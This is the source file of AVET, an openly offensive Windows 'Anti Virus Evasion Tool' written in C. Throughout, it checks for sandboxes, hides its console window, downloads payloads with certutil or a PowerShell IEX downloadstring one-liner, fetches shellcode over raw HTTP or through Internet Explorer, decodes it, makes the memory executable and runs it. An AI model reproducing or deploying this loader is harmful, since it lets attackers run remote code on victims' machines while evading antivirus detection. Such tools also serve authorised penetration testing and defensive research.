/*
Author: Daniel Sauder
License: https://www.gnu.org/licenses/gpl.txt or LICENSE file
Web: https://github.com/govolution/avet
*/

//     "         .==,_                                          \n"
//     "        .===,_`\\                                        \n"
//     "      .====,_ ` \\      .====,__                         \n"
//     "---     .==-,`~. \\           `:`.__,                    \n"
//     " ---      `~~=-.  \\           /^^^     MEEP MEEP        \n"
//     "   ---       `~~=. \\         /                          \n"
//     "                `~. \\       /                           \n"
//     "                  ~. \\____./                            \n"
//     "                    `.=====)                            \n"
//     "                 ___.--~~~--.__                         \n"
//     "       ___\\.--~~~              ~~~---.._|/              \n"
//     "       ~~~\\\"                             /              \n"

//     " ________  ___      ___ _______  _________  \n" 
//     "|\\   __  \\|\\  \\    /  /|\\  ___ \\|\\___   ___\\ \n"
//     "\\ \\  \\|\\  \\ \\  \\  /  / | \\   __/\\|___ \\  \\_| \n"
//     " \\ \\   __  \\ \\  \\/  / / \\ \\  \\_|/__  \\ \\  \\  \n"
//     "  \\ \\  \\ \\  \\ \\    / /   \\ \\  \\_|\\ \\  \\ \\  \\ \n"
//     "   \\ \\__\\ \\__\\ \\__/ /     \\ \\_______\\  \\ \\__\\\n"
//     "    \\|__|\\|__|\\|__|/       \\|_______|   \\|__|\n"
//         "\n\nAnti Virus Evasion Tool by Daniel Sauder\n"

#include "defs.h"
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <tchar.h>
#ifdef KVALUE
	#include <winsock2.h>
#endif
#ifdef DOWNLOADEXECSC
	#include "WinSock2.h"
	#include "Ws2tcpip.h"
#endif
#include <windows.h>

int get_filesize(char *fvalue);
unsigned char* load_textfile(char *fvalue, unsigned char *buf, int size2);
unsigned char* decode_shellcode(unsigned char *buffer, unsigned char *shellcode, int size);
void exec_shellcode(unsigned char *shellcode);
void exec_shellcode64(unsigned char *shellcode);
#ifdef UVALUE
char* ie_download(char* string, char* sh_filename);
#endif
#ifdef ASCIIMSF
void exec_shellcode_ASCIIMSF(unsigned char *shellcode);
#endif
#ifdef DOWNLOADEXECSC
unsigned char* downloadshellcode(char* uri);
#endif

int main (int argc, char **argv)
{
	#ifdef QUIET
		ShowWindow(GetConsoleWindow(), SW_HIDE);
	#endif
		
	char *fvalue = NULL;
	char *uvalue = NULL;

	int index;
	int c;

	opterr = 0;

	// do evading here with fopen technique
	#ifdef SANDBOX_FOPEN
		#ifdef PRINT_DEBUG
		printf("use fopen sandbox escape\n");
		#endif
		FILE *fp = fopen("c:\\windows\\system.ini", "rb");
		if (fp == NULL)
			return 0;
		fclose(fp);
	#endif

	//evading with gethostbyname technique
	#ifdef KVALUE
		#ifdef PRINT_DEBUG
		printf("use  gethostbyname sandbox evasion\n");
		#endif
		struct hostent *hp = gethostbyname(KVALUE);
		if (hp != NULL) 		
			exit(0);

	#endif

//#if defined(DOWNLOADCERTUTIL) || defined(DOWNLOADPOWERSHELL)
//download a file and write to disk
#ifdef DOWNLOADCERTUTIL
	char download[500];  //how not to do it...
	sprintf(download,"certutil.exe -urlcache -split -f %s",argv[2]);
	#ifdef PRINT_DEBUG
		printf("url: %s\n", download);
	#endif
	system(download);
	#ifdef PRINT_DEBUG
		printf("download done\n");
	#endif
#endif

#ifdef DOWNLOADPOWERSHELL
	char download[500];
	sprintf(download,"powershell.exe \"IEX ((new-object net.webclient).downloadstring('%s'))\"",argv[2]);
	#ifdef PRINT_DEBUG
		printf("url: %s\n", download);
	#endif
	system(download);
#endif

	#ifdef LVALUE
		fvalue=argv[1];
	#endif

	#ifdef PRINT_DEBUG
		printf ("fvalue = %s ", fvalue);
		printf ("uvalue = %s \n", uvalue);
		for (index = optind; index < argc; index++)
			printf ("Non-option argument %s\n", argv[index]);
	#endif

// compute #defines from defs.h
#ifdef FVALUE
	int size = strlen(FVALUE);
	fvalue=(char*)malloc(size);
	strcpy(fvalue,FVALUE);
#endif

#ifdef UVALUE
	int size = strlen(UVALUE);
	uvalue=(char*)malloc(size);
	strcpy(uvalue,UVALUE);
#endif

	// exec shellcode from a given file or from defs.h
	if (fvalue)
	{
		unsigned char *buffer;
		unsigned char *shellcode;
		int size;
//#ifndef FVALUE
#ifdef LVALUE
	#ifdef PRINT_DEBUG
		printf("exec shellcode from file\n");
	#endif
		size = get_filesize(fvalue);
		buffer = load_textfile(fvalue, buffer, size);
#endif
	#ifdef FVALUE
		size = strlen (FVALUE);
		buffer = FVALUE;
	#endif

	#ifdef ENCRYPT 
		#ifdef PRINT_DEBUG
		printf ("size %d\n",size);
		//printf ("%s\n",FVALUE);
		printf("exec shellcode with decode_shellcode\n");
		#endif
		shellcode = decode_shellcode(buffer,shellcode,size);
	#endif

	#ifndef ENCRYPT
		#ifdef LVALUE
		unsigned char *buf = buffer; //that does the trick, although not nice. Needed for raw sc execution with -l
		#endif
	#ifndef ASCIIMSF 
	#ifndef DOWNLOADEXECSC
		#ifdef PRINT_DEBUG
		printf("exec shellcode without decode_shellcode\n");
		#endif
		shellcode = buf;
	#endif
	#endif
	#endif

	#ifndef X64 
	#ifndef ASCIIMSF
		exec_shellcode(shellcode);
	#endif
	#ifdef ASCIIMSF
		exec_shellcode_ASCIIMSF(shellcode);
	#endif
	#endif
	#ifdef X64
		exec_shellcode64(shellcode);
	#endif
	}
	// exec from url
#ifdef UVALUE
	else if (uvalue)
	{
		#ifdef PRINT_DEBUG
			printf("exec shellcode from url\n");
		#endif

		char *sh_filename;
		sh_filename = ie_download(uvalue, sh_filename);
		int x=strlen(sh_filename);
		
#ifdef PRINT_DEBUG	
		printf("\n\n%d\n\n", x);
#endif

		unsigned char *buffer;
		unsigned char *shellcode;

		int size = get_filesize(sh_filename);
		buffer = load_textfile(sh_filename, buffer, size);
#ifdef ENCRYPT
		shellcode = decode_shellcode(buffer,shellcode,size);
#else
		shellcode = buf;
#endif
#ifndef X64 
		exec_shellcode(shellcode);
#endif
#ifdef X64
		exec_shellcode64(shellcode);
#endif
	}
#endif

#ifdef DOWNLOADEXECSC
	unsigned char *shellcode = downloadshellcode(argv[1]);
#ifndef X64
	exec_shellcode(shellcode);
#endif
#ifdef X64
	exec_shellcode64(shellcode);
#endif
#endif

	return 0;
}

#ifdef DOWNLOADEXECSC
//host=argv[1]
unsigned char* downloadshellcode(char* uri)
{
	struct WSAData* wd = (struct WSAData*)malloc(sizeof(struct WSAData));
	if (WSAStartup(MAKEWORD(2, 0), wd))
		exit(1);
	free(wd);
	SOCKET sock;
	
	char c;
	int i, j;
	char* file;
	char* host = uri;
	struct addrinfo* ai;
	struct addrinfo hints;
	char buf[512];

	//if (argc == 3) file = argv[2]; else 
	file = strrchr(uri, '/') + 1;
	if (strstr(uri, "http://") == uri) host += 7;
	memset(&hints, 0, sizeof(struct addrinfo));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;
	sprintf(buf, "GET %s HTTP/1.1\r\n", uri);
	*strchr(host, '/') = '\0';
	if (i = getaddrinfo(host, "80", &hints, &ai)) exit(1); 
	sprintf(buf + strlen(buf), "Host: %s\r\n\r\n", host);
	sock = socket(ai->ai_family, ai->ai_socktype, ai->ai_protocol);
	if (connect(sock, ai->ai_addr, ai->ai_addrlen))
		exit(1);
	freeaddrinfo(ai);
	i = send(sock, buf, strlen(buf), 0);
	if (i < strlen(buf) || i == -1) exit(1);
	while (strcmp(buf, "\r\n")) {
		for (i = 0; strcmp(buf + i - 2, "\r\n"); i++) { recv(sock, buf + i, 1, 0); buf[i + 1] = '\0'; }
		if (strstr(buf, "HTTP/") == buf) {
			if (strcmp(strchr(buf, ' ') + 1, "200 OK\r\n")) exit(1);
		}
		if (strstr(buf, "Content-Length:") == buf) {
			*strchr(buf, '\r') = '\0';
			j = atoi(strchr(buf, ' ') + 1);
		}
	}

	unsigned char *sc=(char*)malloc(j * sizeof(char));
	for (i = 0; i < j; i++) 
	{ 
		recv(sock, &c, 1, 0); 
		sc[i]=c;
		//printf("%c",c);
	}

	closesocket(sock);
	WSACleanup();

	return sc;	
}
#endif

#if defined(LVALUE) || defined(UVALUE)
int get_filesize(char *fvalue)
{
	int size,rc1;
	FILE *fp1 = fopen(fvalue, "rb");
	if (fp1 == NULL)
	{
		printf("get_filesize, %s not found\n", fvalue);
		return 0;
	}
	for (size = 0; (rc1 = getc(fp1)) != EOF; size++) {}
	fclose(fp1);
	
	#ifdef PRINT_DEBUG
		printf("get_filesize, filesize %s: %d\n", fvalue, size);
	#endif

	return size;
}
#endif

#if defined(LVALUE) || defined(UVALUE)
// return pointer to text buffer
unsigned char* load_textfile(char *fvalue, unsigned char *buffer, int size)
{
	#ifdef PRINT_DEBUG
		printf("load_textfile called: fvalue: %s, size: %d\n", fvalue, size);
	#endif

	//allocate buffer, open file, read file to the buffer, close the file
	buffer=(unsigned char*)malloc(size+1);
	int i, rc;

	for (i=0; i<size; i++)
		buffer[i]=0x0;

	FILE *fp = fopen(fvalue, "rb");
	if (fp == NULL)
	{
		printf("load_textfile, %s not found\n", fvalue);
		return 0;
	}

	for (i=0; i<size; i++)
	{
		rc = getc(fp);
		buffer[i] = rc;
	}

	#ifdef PRINT_DEBUG
		printf("%s\n",buffer);
	#endif

	fclose(fp);
	return buffer;
}
#endif

// return pointer to shellcode
unsigned char* decode_shellcode(unsigned char *buffer, unsigned char *shellcode, int size)
{
	int j=0;
	shellcode=malloc((size/2));

	#ifdef PRINT_DEBUG
		printf("decode_shellcode, size for malloc: %d\nShellcode output:\n",size/2);
	#endif

	int i=0;
	do
	{
		unsigned char temp[3]={0};
		sprintf((char*)temp,"%c%c",buffer[i],buffer[i+1]);
		shellcode[j] = strtoul(temp, NULL, 16);

		#ifdef PRINT_DEBUG
			printf("%x",shellcode[j]);
		#endif

		i+=2;
		j++;
	} while(i<size);

	#ifdef PRINT_DEBUG
		printf("\n ");
	#endif

	return shellcode;
}

#ifndef X64
#ifndef ASCIIMSF
void exec_shellcode(unsigned char *shellcode)
{
	#ifdef PRINT_DEBUG
		printf("exec_shellcode\n ");
		int size=strlen(shellcode);
		printf("shellcode size: %d\n", size);
	#endif

	int (*funct)();
	funct = (int (*)()) shellcode;
	(int)(*funct)();
}
#endif
#ifdef ASCIIMSF
void exec_shellcode_ASCIIMSF(unsigned char *shellcode)
{
	#ifdef PRINT_DEBUG
		printf("exec_shellcode_ASCIIMSF\n ");
		int size=strlen(shellcode);
		printf("shellcode size: %d\n", size);
	#endif

	register unsigned char* r asm("eax");
	r=shellcode;
	asm("call *%eax;");
}
#endif
#endif


#ifdef X64
void exec_shellcode64(unsigned char *shellcode)
{
#ifdef PRINT_DEBUG
	printf("exec_shellcode64\n ");
	int size=strlen(shellcode);
	printf("shellcode size: %d\n", size);
#endif
	int len=strlen(shellcode);
	DWORD l=0;
	VirtualProtect(shellcode,len,PAGE_EXECUTE_READWRITE,&l);
	(* (int(*)()) shellcode)();
}
#endif

#ifdef UVALUE
// return pointer to the filename
char* ie_download(char* string, char* sh_filename)
{
	char ie[500];
	GetEnvironmentVariable("PROGRAMFILES",ie,100);
	strcat(ie,"\\Internet Explorer\\iexplore.exe");
	ShellExecute(0, "open", ie , string, NULL, SW_SHOWDEFAULT);

	// wait a little until the file is loaded
	Sleep(8000);

	// get the filename to search format in the ie temp directory
	char delimiter[] = "/";
	char *ptr;
	char *fname;
	ptr = strtok(string, delimiter);
	while(ptr != NULL)
	{
		fname = ptr;
		ptr = strtok(NULL, delimiter);
	}

	#ifdef PRINT_DEBUG
		printf("ie_download, filename: %s\n", fname);
	#endif

	// split the filename
	char delimiter2[] = ".";
	char *sname;
	ptr = strtok(fname, delimiter2);
	sname = ptr;
	ptr = strtok(NULL, delimiter2);

	#ifdef PRINT_DEBUG
		printf("ie_download, name to search for: %s\n", sname);
	#endif

	// search for the file in user profile

	// build searchstring
	char tmp[150];
	char tmp_home[150];
	GetEnvironmentVariable ("USERPROFILE",tmp_home,150);
	GetEnvironmentVariable ("TEMP",tmp,150);
	tmp [ strlen(tmp) - 5 ] = 0x0;
	//printf("\n\n%s\n\n",tmp);
	char searchstring[500] = "/C ";
	strncat (searchstring,tmp_home,1);
	strcat (searchstring,": && cd \"");
	strcat (searchstring,tmp);
	strcat (searchstring,"\" && dir . /s /b | find \"");
	strcat (searchstring,sname);
	strcat (searchstring,"\" > \"");
	strcat (searchstring,tmp_home);
	strcat (searchstring,"\\shellcodefile.txt\"");
	
	#ifdef PRINT_DEBUG
		printf ("ie_download, searchstring: %s\n", searchstring);
	#endif

	// build & execute cmd
	char cmd[500];
	GetEnvironmentVariable ("WINDIR",cmd,500);
	strcat (cmd,"\\system32\\cmd.exe");
	ShellExecute (0, "open", "cmd.exe" , searchstring, NULL, SW_SHOWDEFAULT);

	//now read the directory + filename from the textfile
	char dirfile[500] = {0};
	strcat (dirfile, tmp_home);
	strcat (dirfile, "\\shellcodefile.txt");
	//char *sh_filename;
	int size_sh_filename=0;
	int counter = 0;
	while(size_sh_filename==0 && counter <= 1000)
	{
		size_sh_filename = get_filesize (dirfile);
		Sleep(500);
		counter++;
	}

	sh_filename = load_textfile (dirfile, sh_filename, size_sh_filename);
	// there is always emtpy space at the end of the file -> delete that
	sh_filename[size_sh_filename-2]=0x0;
	
	#ifdef PRINT_DEBUG
		printf ("ie_download, sh_filename: >>>%s<<<, size: %d\ntest\n", sh_filename, size_sh_filename);
	#endif

	return sh_filename;
}
#endif


